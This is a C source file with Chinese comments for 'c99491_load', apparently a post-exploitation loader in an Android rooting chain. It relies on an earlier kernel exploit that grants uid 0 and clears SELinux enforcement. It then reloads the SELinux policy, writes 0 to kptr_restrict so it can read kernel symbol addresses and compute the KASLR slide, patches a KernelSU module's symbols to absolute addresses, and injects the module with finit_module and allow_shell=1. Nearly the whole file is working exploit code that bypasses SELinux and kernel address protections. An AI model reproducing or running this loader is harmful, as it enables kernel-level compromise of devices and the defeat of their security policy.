/*
 * c99491_load —— 单进程 KernelSU 模块加载器（B 方案核心）。
 *
 * 实测结论链：
 *   - cred 改写后 uid=0 且 CapPrm 含 SYSLOG+SYS_MODULE；
 *   - Enforcing 下 finit_module 被 AVC 拒绝（denied { sys_module } capability=16）；
 *   - permissive 窗口内 finit_module 可以成功；
 *   - 但清零 selinux_state 前 8 字节会同时清掉 enforcing、initialized、
 *     policycap[0..5]，只写回 enforcing 不足以恢复，系统数分钟后仍会重启；
 *   - 解决办法：窗口内先重载运行策略（/sys/fs/selinux/policy → /load），
 *     由内核重建 initialized 与 policycap；顺序必须在模块加载之前，
 *     否则会冲掉模块注入的 ksu 域。
 *
 * 完整顺序：
 *   1. 等 cred（uid=0 且 CapPrm 含 SYSLOG+SYS_MODULE）
 *   2. 等 permissive 窗口（enforce==0）
 *   3. 重载策略（重建 initialized/policycap）
 *   4. 求 slide（文件 / kallsyms / 参数）
 *   5. 解析 KO symtab，用离线表把未定义符号改成 SHN_ABS + 绝对地址
 *   6. memfd → finit_module
 *   7. 恢复 enforce=1
 *
 * 用法：c99491_load [--slide 0x..] [--ko path] [--table path]
 * 日志：/data/local/tmp/c99491_load.log（每步 fsync）
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define LOG_PATH "/data/local/tmp/c99491_load.log"
#define DEFAULT_KO "/data/local/tmp/ksu.ko"
#define DEFAULT_TABLE "/data/local/tmp/ksu_syms.txt"
#define SLIDE_FILE "/data/local/tmp/slide.txt"
#define KPTR_PATH "/proc/sys/kernel/kptr_restrict"
#define POLICY_PATH "/sys/fs/selinux/policy"
#define LOAD_PATH "/sys/fs/selinux/load"
#define MAX_SYMS 512
#define SHN_UNDEF 0
#define SHN_ABS 0xfff1
#define SHT_SYMTAB 2

struct ehdr64 {
	unsigned char e_ident[16];
	unsigned short e_type, e_machine;
	unsigned int e_version;
	unsigned long long e_entry, e_phoff, e_shoff;
	unsigned int e_flags;
	unsigned short e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum,
		e_shstrndx;
};

struct shdr64 {
	unsigned int sh_name, sh_type;
	unsigned long long sh_flags, sh_addr, sh_offset, sh_size;
	unsigned int sh_link, sh_info;
	unsigned long long sh_addralign, sh_entsize;
};

struct sym64 {
	unsigned int st_name;
	unsigned char st_info, st_other;
	unsigned short st_shndx;
	unsigned long long st_value, st_size;
};

static struct {
	char name[64];
	unsigned long long addr;
} tbl[MAX_SYMS];
static int ntbl;

static FILE *g_log;

static void logf_(const char *fmt, ...)
{
	va_list ap;

	if (!g_log)
		return;
	va_start(ap, fmt);
	vfprintf(g_log, fmt, ap);
	va_end(ap);
	fflush(g_log);
	fsync(fileno(g_log));
}

static unsigned long long cap_of(const char *key)
{
	char line[256];
	FILE *s = fopen("/proc/self/status", "r");
	unsigned long long v = 0;

	if (!s)
		return 0;
	while (fgets(line, sizeof(line), s)) {
		if (!strncmp(line, key, strlen(key))) {
			sscanf(line + strlen(key), "%llx", &v);
			break;
		}
	}
	fclose(s);
	return v;
}

static int enforce_now(void)
{
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
	char c = 0;

	if (fd < 0)
		return -1;
	if (read(fd, &c, 1) != 1)
		c = 0;
	close(fd);
	return c == '0' ? 0 : 1;
}

static int set_enforce(int on)
{
	int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
	int rc;

	if (fd < 0)
		return -1;
	rc = (int)write(fd, on ? "1" : "0", 1);
	close(fd);
	return rc == 1 ? 0 : -1;
}

static int write_str(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY);
	int rc;

	if (fd < 0)
		return -1;
	rc = (int)write(fd, s, strlen(s));
	close(fd);
	return rc > 0 ? 0 : -1;
}

/* 重载运行中的策略：读 /sys/fs/selinux/policy 再写回 /sys/fs/selinux/load。
 * 内核会据此重建 selinux_state 的 initialized 与 policycap。 */
static int reload_policy(void)
{
	int in, out;
	unsigned char *buf;
	ssize_t total = 0, n;
	int ok = -1;

	in = open(POLICY_PATH, O_RDONLY);
	if (in < 0) {
		logf_("open policy failed errno=%d\n", errno);
		return -1;
	}
	buf = malloc(4 * 1024 * 1024);
	if (!buf) {
		close(in);
		logf_("policy malloc failed\n");
		return -1;
	}
	while ((n = read(in, buf + total, 4 * 1024 * 1024 - (size_t)total)) > 0)
		total += n;
	close(in);
	logf_("policy read=%ld bytes\n", (long)total);
	if (total <= 0) {
		free(buf);
		return -1;
	}

	out = open(LOAD_PATH, O_WRONLY);
	if (out < 0) {
		logf_("open load failed errno=%d\n", errno);
		free(buf);
		return -1;
	}
	n = write(out, buf, (size_t)total);
	logf_("policy write=%ld errno=%d (%s)\n", (long)n, errno, strerror(errno));
	if (n == total)
		ok = 0;
	close(out);
	free(buf);
	return ok;
}

static unsigned long long table_lookup(const char *name)
{
	for (int i = 0; i < ntbl; i++)
		if (!strcmp(tbl[i].name, name))
			return tbl[i].addr;
	return 0;
}

static int load_table(const char *path)
{
	FILE *f = fopen(path, "r");
	char line[160];

	if (!f) {
		logf_("open table failed errno=%d (%s)\n", errno, path);
		return -1;
	}
	while (fgets(line, sizeof(line), f) && ntbl < MAX_SYMS) {
		char nm[64];
		unsigned long long a;

		if (sscanf(line, "%63s %llx", nm, &a) != 2)
			continue;
		snprintf(tbl[ntbl].name, sizeof(tbl[ntbl].name), "%s", nm);
		tbl[ntbl].addr = a;
		ntbl++;
	}
	fclose(f);
	logf_("table=%s entries=%d\n", path, ntbl);
	return ntbl;
}

static unsigned long long slide_from_file(void)
{
	FILE *f = fopen(SLIDE_FILE, "r");
	unsigned long long v = 0;

	if (!f)
		return 0;
	if (fscanf(f, "%llx", &v) != 1)
		v = 0;
	fclose(f);
	return v;
}

static unsigned long long slide_from_kallsyms(void)
{
	unsigned long long link = table_lookup("selinux_state");
	unsigned long long a = 0;
	int kptr = -1;
	FILE *f;

	if (!link)
		return 0;
	{
		FILE *k = fopen(KPTR_PATH, "r");

		if (k) {
			if (fscanf(k, "%d", &kptr) != 1)
				kptr = -1;
			fclose(k);
		}
	}
	write_str(KPTR_PATH, "0");
	f = fopen("/proc/kallsyms", "r");
	if (f) {
		char line[512], nm[256], type;

		while (fgets(line, sizeof(line), f)) {
			unsigned long long v;

			if (sscanf(line, "%llx %c %255s", &v, &type, nm) != 3)
				continue;
			if (!strcmp(nm, "selinux_state")) {
				a = v;
				break;
			}
		}
		fclose(f);
	}
	if (kptr >= 0)
		write_str(KPTR_PATH, "2");
	return (a && a > link) ? a - link : 0;
}

int main(int argc, char **argv)
{
	const char *ko_path = DEFAULT_KO, *table = DEFAULT_TABLE;
	unsigned long long slide = 0;
	unsigned char *img = NULL;
	struct stat st;
	int fd = -1, memfd = -1, rc, patched = 0, missing = 0;
	struct ehdr64 *eh;
	struct shdr64 *sh;
	struct sym64 *syms;
	char *strtab = NULL;
	size_t strsize = 0;

	g_log = fopen(LOG_PATH, "w");
	if (!g_log)
		return 1;
	logf_("=== c99491_load start %ld ===\n", (long)time(NULL));

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			slide = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--ko") && i + 1 < argc)
			ko_path = argv[++i];
		else if (!strcmp(argv[i], "--table") && i + 1 < argc)
			table = argv[++i];
	}

	/* 1) 等 cred */
	for (int i = 0; i < 320; i++) {
		unsigned long long prm = cap_of("CapPrm:");

		if (getuid() == 0 && (prm & (1ULL << 34)) && (prm & (1ULL << 16)))
			break;
		usleep(250000);
	}
	logf_("uid=%d CapPrm=%#llx CapEff=%#llx\n", (int)getuid(),
	      cap_of("CapPrm:"), cap_of("CapEff:"));
	if (getuid() != 0 || !(cap_of("CapPrm:") & (1ULL << 16))) {
		logf_("=== abort: 凭据未就绪 ===\n");
		return 2;
	}

	if (load_table(table) <= 0) {
		logf_("=== abort: 符号表不可用 ===\n");
		return 3;
	}

	/* 2) 等 permissive 窗口 */
	for (int i = 0; i < 200; i++) {
		if (enforce_now() == 0)
			break;
		usleep(100000);
	}
	logf_("enforce(window)=%d\n", enforce_now());

	/* 3) 重建 SELinux 状态（必须在模块加载之前） */
	logf_("reload_policy rc=%d\n", reload_policy());

	/* 4) 求 slide */
	if (!slide)
		slide = slide_from_file();
	if (slide)
		logf_("slide(文件)=%#llx\n", slide);
	if (!slide) {
		slide = slide_from_kallsyms();
		logf_("slide(kallsyms)=%#llx\n", slide);
	}
	if (!slide) {
		logf_("=== abort: 无法确定 slide ===\n");
		return 4;
	}

	/* 5) 读 KO 并打符号补丁 */
	fd = open(ko_path, O_RDONLY);
	if (fd < 0) {
		logf_("open ko failed errno=%d\n", errno);
		return 5;
	}
	if (fstat(fd, &st) != 0) {
		logf_("stat ko failed errno=%d\n", errno);
		return 6;
	}
	img = malloc((size_t)st.st_size);
	if (!img || read(fd, img, (size_t)st.st_size) != (ssize_t)st.st_size) {
		logf_("read ko failed\n");
		return 7;
	}
	close(fd);
	logf_("ko size=%ld\n", (long)st.st_size);

	eh = (struct ehdr64 *)img;
	if (memcmp(eh->e_ident, "\177ELF", 4) != 0) {
		logf_("not ELF\n");
		return 8;
	}
	sh = (struct shdr64 *)(img + eh->e_shoff);

	for (int i = 0; i < eh->e_shnum; i++) {
		if (sh[i].sh_type == SHT_SYMTAB) {
			int nsym = (int)(sh[i].sh_size / sizeof(struct sym64));

			syms = (struct sym64 *)(img + sh[i].sh_offset);
			strtab = (char *)(img + sh[sh[i].sh_link].sh_offset);
			strsize = (size_t)sh[sh[i].sh_link].sh_size;
			logf_("symtab sect=%d syms=%d\n", i, nsym);

			for (int k = 1; k < nsym; k++) {
				const char *nm;
				unsigned long long addr;

				if (syms[k].st_shndx != SHN_UNDEF)
					continue;
				if (syms[k].st_name >= strsize)
					continue;
				nm = strtab + syms[k].st_name;
				addr = table_lookup(nm);
				if (!addr) {
					missing++;
					if (missing <= 5)
						logf_("  miss: %s\n", nm);
					continue;
				}
				syms[k].st_shndx = SHN_ABS;
				syms[k].st_value = addr + slide;
				patched++;
			}
			break;
		}
	}
	logf_("patched=%d missing=%d\n", patched, missing);
	if (missing > 0) {
		logf_("=== abort: %d 个符号不在表中 ===\n", missing);
		return 9;
	}

	/* 6) memfd + finit_module */
	memfd = (int)syscall(SYS_memfd_create, "ksu", 0);
	if (memfd < 0) {
		logf_("memfd_create failed errno=%d\n", errno);
		return 10;
	}
	if (write(memfd, img, (size_t)st.st_size) != (ssize_t)st.st_size) {
		logf_("memfd write failed errno=%d\n", errno);
		return 11;
	}
	lseek(memfd, 0, SEEK_SET);

	errno = 0;
	rc = (int)syscall(SYS_finit_module, memfd, "allow_shell=1", 0);
	logf_("finit_module rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
	close(memfd);

	/* 7) 恢复 Enforcing */
	logf_("restore enforce rc=%d\n", set_enforce(1));
	logf_("enforce_after=%d\n", enforce_now());
	logf_("su_exists=%d\n", access("/system/bin/su", X_OK) == 0);
	logf_("=== done ===\n");
	fclose(g_log);
	return rc == 0 ? 0 : 12;
}
